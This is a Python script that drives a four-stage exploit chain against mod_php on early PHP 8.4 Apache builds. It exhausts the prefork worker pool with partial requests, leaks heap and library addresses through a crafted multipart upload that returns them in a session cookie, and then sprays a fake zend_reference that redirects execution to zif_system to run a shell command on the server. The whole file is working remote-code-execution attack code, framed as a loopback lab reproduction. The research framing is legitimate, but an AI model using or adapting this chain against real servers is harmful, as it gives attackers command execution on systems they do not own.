#!/usr/bin/env python3
"""A1 -> B1 -> A2 -> B2 mod_php chain driver for early PHP 8.4 builds.

Reproduces the documented lab procedure: stock prefork 5/150 pool, capped-pool
pin (149 partial-header occupiers + 1 idle child), chunked A1 with the five
dummy query parameters, single chunked B1, plain A2, plain B2 with a fake
zend_reference -> zif_system.  Proof must be written by the target itself.

Only loopback traffic; one lab container per build.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import socket
import struct
import subprocess
import sys
import time
import urllib.parse
from collections import Counter

HERE = os.path.dirname(os.path.abspath(__file__))
PURE = os.path.join(HERE, "pure")
sys.path.insert(0, PURE)
from cheap_oom_a import build_body as build_a2  # noqa: E402
from fake_ref_b import make_spray, make_name      # noqa: E402
from mk_ht import build as build_ht              # noqa: E402

BOUND = b"C" * 10


def sh(cmd, timeout=60):
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def dexec(container, cmd):
    return sh(["docker", "exec", container, "bash", "-lc", cmd])


def parent_pid(container):
    r = dexec(container, "pgrep -f 'apache2 -DFOREGROUND' | head -1")
    try:
        return int(r.stdout.strip())
    except ValueError:
        return -1


def children(container):
    ppid = parent_pid(container)
    if ppid < 0:
        return -1
    r = dexec(container, "pgrep -P %d | wc -l" % ppid)
    try:
        return int(r.stdout.strip())
    except ValueError:
        return -1


def established_dport(port):
    r = sh(["ss", "-Htn", "state", "established", "dport", "= :%d" % port])
    return len([ln for ln in r.stdout.splitlines() if ln.strip()])


def send_plain(port, path, body, timeout=300, save=None):
    req = ("POST %s HTTP/1.1\r\nHost: 127.0.0.1:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n" %
           (path, port, BOUND.decode(), len(body))).encode()
    out = bytearray()
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
        s.settimeout(timeout)
        try:
            s.sendall(req + body)
            while len(out) < (32 << 20):
                chunk = s.recv(65536)
                if not chunk:
                    break
                out.extend(chunk)
        except OSError:
            pass
        finally:
            s.close()
    except OSError as exc:
        return b"", "connect_error:%r" % (exc,)
    if save:
        with open(save, "wb") as fh:
            fh.write(bytes(out))
    return bytes(out), "ok"


def send_chunked(port, path, body_file, save, timeout=300):
    cmd = [sys.executable, os.path.join(PURE, "chunked_send.py"),
           "--port", str(port), "--body-file", body_file, "--path", path,
           "--timeout", str(timeout), "--save-response", save]
    pr = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 30)
    return pr.returncode, pr.stdout.strip(), pr.stderr.strip()


def last_log_line(logpath, offset):
    if not os.path.exists(logpath):
        return None, offset
    with open(logpath, "rb") as fh:
        fh.seek(offset)
        data = fh.read()
        offset = fh.tell()
    lines = [ln for ln in data.decode("latin1", "replace").splitlines() if ln.strip()]
    return (lines[-1] if lines else None), offset


def pid_of(line):
    if not line:
        return None
    try:
        return int(line.split()[0])
    except (ValueError, IndexError):
        return None


def parse_leak(resp, zdtor_off):
    i = resp.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        raise RuntimeError("no Set-Cookie")
    val = resp[i + len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    dec = urllib.parse.unquote_to_bytes(val.replace(b"+", b"%20").decode("latin1"))
    counts = Counter()
    for off in range(0, len(dec) - 7, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x7C0000000000 <= q <= 0x800000000000:
            counts[q] += 1
    if not counts:
        raise RuntimeError("no pointers (decoded=%d)" % len(dec))
    zdtor, n = counts.most_common(1)[0]
    lib = zdtor - zdtor_off
    heap = struct.unpack_from("<Q", dec, 0xFE8)[0] if len(dec) >= 0xFF0 else 0
    main = heap & ~0x1FFFFF if heap else 0
    return {"encoded": len(val), "decoded": len(dec), "zdtor": zdtor,
            "zdtor_hits": n, "lib": lib, "heap_fe8": heap, "main": main,
            "lib_minus_main": (lib - main) if main else None,
            "pointer_qwords": sum(counts.values())}


def sha256_file(p):
    h = hashlib.sha256()
    with open(p, "rb") as f:
        for b in iter(lambda: f.read(1 << 20), b""):
            h.update(b)
    return h.hexdigest()


def a2_bytes(fillers):
    return build_a2(880, 64, fillers, b"a" * 32, b"k0", b"C" * 10)


def b2_bytes(S, zif, cmd, vl=352, n1=500, n2=495):
    ht = build_ht(S, zif, cmd.encode(), 384)
    spray = make_spray(vl, S, 1, 0x0107, 8, 32)

    def part(name, value):
        return (b"--" + BOUND + b"\r\nContent-Disposition: form-data; name=\"" +
                name + b"\"\r\n\r\n" + value + b"\r\n")
    body = bytearray()
    for i in range(n1):
        body += part(make_name(b"s", i, 10), spray)
    body += part(b"ht", ht)
    body += part(b"PHPSESSID", b"a" * 32)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(n2):
        body += part(make_name(b"t", i, 10), spray)
    body += b"--" + BOUND + b"--\r\n"
    return bytes(body)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--container", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--tag", required=True)
    ap.add_argument("--build", required=True)
    ap.add_argument("--zdtor", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--zif", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--soff", type=lambda x: int(x, 0), default=0xED398)
    ap.add_argument("--a1", required=True)
    ap.add_argument("--b1", required=True)
    ap.add_argument("--fillers", type=int, default=115)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--logdir", required=True, help="host dir bind-mounted at /var/log/apache2")
    ap.add_argument("--path", default="/index.php", help="request path on the target")
    ap.add_argument("--proof-path", default="")
    ap.add_argument("--pin", type=int, default=149)
    ap.add_argument("--max-b1", type=int, default=3)
    ap.add_argument("--max-b2", type=int, default=3)
    ap.add_argument("--restart", action="store_true")
    args = ap.parse_args()

    os.makedirs(args.outdir, exist_ok=True)
    proof_path = args.proof_path or ("/var/log/apache2/pwn%s" % args.tag)
    out = {"tag": args.tag, "build": args.build, "container": args.container,
           "port": args.port, "zdtor_off": hex(args.zdtor), "zif_off": hex(args.zif),
           "s_off": hex(args.soff), "stages": [], "success": False}
    for k, p in (("a1", args.a1), ("b1", args.b1)):
        out[k] = {"path": os.path.basename(p), "bytes": os.path.getsize(p),
                  "sha256": sha256_file(p)}

    if args.restart:
        subprocess.run(["docker", "restart", args.container], capture_output=True)
        time.sleep(2.0)

    # readiness
    try:
        s = socket.create_connection(("127.0.0.1", args.port), timeout=5)
        s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n")
        s.recv(4096)
        s.close()
    except OSError as exc:
        out["failed"] = "not_ready:%r" % (exc,)
        json.dump(out, open(os.path.join(args.outdir, "result.json"), "w"), indent=1)
        print("FAILED not ready", exc)
        return 2

    logpath = os.path.join(args.logdir, "p2s-access.log")
    logoff = os.path.getsize(logpath) if os.path.exists(logpath) else 0

    # environment manifest
    insp = sh(["docker", "inspect", args.container])
    try:
        meta = json.loads(insp.stdout)[0]
        out["env"] = {
            "image": meta["Config"]["Image"],
            "container_id": meta["Id"],
            "image_id": meta["Image"],
            "mounts": [{"src": m["Source"], "dst": m["Destination"], "rw": m["RW"]}
                       for m in meta["Mounts"]],
        }
    except Exception as exc:
        out["env"] = {"inspect_error": str(exc)}
    for k, cmd in (("php", "php -v | head -1"), ("apache", "apache2 -v | head -1"),
                   ("mpm", "grep -v '^#' /etc/apache2/mods-enabled/mpm_prefork.conf | grep -v '^$'"),
                   ("php_ini_sha256", "sha256sum /usr/local/etc/php/php.ini | cut -d' ' -f1"),
                   ("index_sha256", "sha256sum /var/www/html/index.php | cut -d' ' -f1"),
                   ("index_size", "stat -c %s /var/www/html/index.php")):
        out["env"][k] = dexec(args.container, cmd).stdout.strip()
    out["env"]["image_repo_digests"] = sh(
        ["docker", "image", "inspect", "--format", "{{json .RepoDigests}}",
         "php:%s-apache" % args.build]).stdout.strip()

    # capped-pool pin
    occupiers = []
    t0 = time.time()
    for i in range(args.pin):
        try:
            s = socket.create_connection(("127.0.0.1", args.port), timeout=10)
            s.sendall(b"GET /occupied HTTP/1.1\r\nHost: x\r\n")
            occupiers.append(s)
        except OSError:
            break
    pin = None
    for _ in range(40):
        ch = children(args.container)
        est = established_dport(args.port)
        pin = {"parent": parent_pid(args.container), "children": ch,
               "established": est, "occupiers": len(occupiers)}
        if ch >= 150 and est >= args.pin:
            break
        time.sleep(0.25)
    pin["elapsed"] = round(time.time() - t0, 2)
    pin["accepted"] = bool(pin["children"] >= 150 and pin["established"] >= args.pin)
    out["pin"] = pin
    print("PIN", pin, flush=True)
    if not pin["accepted"]:
        out["failed"] = "pin"
        json.dump(out, open(os.path.join(args.outdir, "result.json"), "w"), indent=1)
        for s in occupiers:
            s.close()
        return 3

    try:
        # A1
        a1_resp = os.path.join(args.outdir, "a1.resp")
        t = time.time()
        rc, so, se = send_chunked(args.port, args.path + "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v",
                                  os.path.abspath(args.a1), a1_resp, timeout=300)
        a1 = open(a1_resp, "rb").read() if os.path.exists(a1_resp) else b""
        line, logoff = last_log_line(logpath, logoff)
        rec = {"stage": "A1", "rc": rc, "status": a1.split(b"\r\n", 1)[0].decode("latin1", "replace"),
               "bytes": len(a1), "elapsed": round(time.time() - t, 2), "pid": pid_of(line),
               "log": line, "stdout": so, "stderr": se}
        out["stages"].append(rec)
        print("A1", {k: rec[k] for k in ("status", "bytes", "pid", "elapsed")}, flush=True)

        # B1
        leak = None
        for attempt in range(args.max_b1):
            b1_resp = os.path.join(args.outdir, "b1_%d.resp" % attempt)
            t = time.time()
            rc, so, se = send_chunked(args.port, args.path, os.path.abspath(args.b1), b1_resp, timeout=300)
            data = open(b1_resp, "rb").read() if os.path.exists(b1_resp) else b""
            line, logoff = last_log_line(logpath, logoff)
            rec = {"stage": "B1", "i": attempt, "rc": rc,
                   "status": data.split(b"\r\n", 1)[0].decode("latin1", "replace"),
                   "bytes": len(data), "elapsed": round(time.time() - t, 2),
                   "pid": pid_of(line), "log": line}
            try:
                info = parse_leak(data, args.zdtor)
                rec["leak"] = info
                if info["decoded"] >= (2 << 20) - 16 and info["zdtor_hits"] >= 1000 and info["main"]:
                    leak = info
                    rec["accepted"] = True
            except Exception as exc:
                rec["leak_error"] = str(exc)
            out["stages"].append(rec)
            print("B1", {k: rec.get(k) for k in ("i", "status", "bytes", "pid", "accepted")},
                  rec.get("leak", rec.get("leak_error")), flush=True)
            if leak:
                break

        if not leak:
            out["failed"] = "B1"
            json.dump(out, open(os.path.join(args.outdir, "result.json"), "w"), indent=1)
            return 4

        S = leak["main"] + args.soff
        zif = leak["lib"] + args.zif
        out["derived"] = {"main": hex(leak["main"]), "lib": hex(leak["lib"]),
                          "S": hex(S), "zif_system": hex(zif),
                          "heap_fe8": hex(leak["heap_fe8"]),
                          "lib_minus_main": hex(leak["lib_minus_main"])}
        out["derived_check"] = {
            "heap_is_main_plus_0x40": leak["heap_fe8"] == leak["main"] + 0x40,
            "lib_page_aligned_4k": (leak["lib"] & 0xFFF) == 0,
            "lib_below_main": leak["lib"] < leak["main"],
        }

        # A2
        a2 = a2_bytes(args.fillers)
        out["a2"] = {"bytes": len(a2), "sha256": hashlib.sha256(a2).hexdigest(),
                     "fillers": args.fillers}
        a2_resp = os.path.join(args.outdir, "a2.resp")
        t = time.time()
        data, err = send_plain(args.port, args.path, a2, timeout=300, save=a2_resp)
        line, logoff = last_log_line(logpath, logoff)
        rec = {"stage": "A2", "err": err, "status": data.split(b"\r\n", 1)[0].decode("latin1", "replace"),
               "bytes": len(data), "elapsed": round(time.time() - t, 2), "pid": pid_of(line), "log": line}
        out["stages"].append(rec)
        print("A2", {k: rec[k] for k in ("status", "bytes", "pid", "elapsed")}, flush=True)

        # B2
        cmd = "id>%s;echo %s>>%s" % (proof_path, args.tag, proof_path)
        out["proof_cmd"] = cmd
        out["proof_path"] = proof_path
        dexec(args.container, "rm -f %s" % proof_path)
        for attempt in range(args.max_b2):
            b2 = b2_bytes(S, zif, cmd)
            if attempt == 0:
                out["b2"] = {"bytes": len(b2), "sha256": hashlib.sha256(b2).hexdigest()}
            b2_resp = os.path.join(args.outdir, "b2_%d.resp" % attempt)
            t = time.time()
            data, err = send_plain(args.port, args.path, b2, timeout=300, save=b2_resp)
            line, logoff = last_log_line(logpath, logoff)
            rec = {"stage": "B2", "i": attempt, "err": err,
                   "status": data.split(b"\r\n", 1)[0].decode("latin1", "replace"),
                   "bytes": len(data), "elapsed": round(time.time() - t, 2),
                   "pid": pid_of(line), "log": line}
            out["stages"].append(rec)
            pr = dexec(args.container, "cat %s" % proof_path)
            st = dexec(args.container, "stat -c '%%U %%G %%u %%g %%s %%a' %s 2>/dev/null" % proof_path)
            rec["proof_stat"] = st.stdout.strip()
            rec["proof_text"] = pr.stdout
            print("B2", {k: rec[k] for k in ("i", "status", "bytes", "pid", "elapsed")},
                  "stat=", rec["proof_stat"], flush=True)
            if pr.returncode == 0 and "uid=33(www-data" in pr.stdout and args.tag in pr.stdout:
                out["proof"] = pr.stdout
                out["success"] = True
                out["b2_hit"] = attempt
                break
            time.sleep(0.4)
        # final read
        pr = dexec(args.container, "cat %s" % proof_path)
        st = dexec(args.container, "stat -c '%%U %%G %%u %%g %%s %%a' %s 2>/dev/null" % proof_path)
        out["proof"] = pr.stdout
        out["proof_stat"] = st.stdout.strip()
        if pr.returncode == 0 and "uid=33(www-data" in pr.stdout and args.tag in pr.stdout:
            out["success"] = True
    finally:
        for s in occupiers:
            try:
                s.close()
            except OSError:
                pass

    out["children_after"] = children(args.container)
    dockerlog = sh(["docker", "logs", "--tail", "300", args.container])
    open(os.path.join(args.outdir, "docker.log"), "w").write(dockerlog.stdout + dockerlog.stderr)
    json.dump(out, open(os.path.join(args.outdir, "result.json"), "w"), indent=1)
    print("RESULT", out.get("success"), (out.get("proof") or "").replace("\n", " | ")[:120], flush=True)
    return 0 if out.get("success") else 5


if __name__ == "__main__":
    raise SystemExit(main())
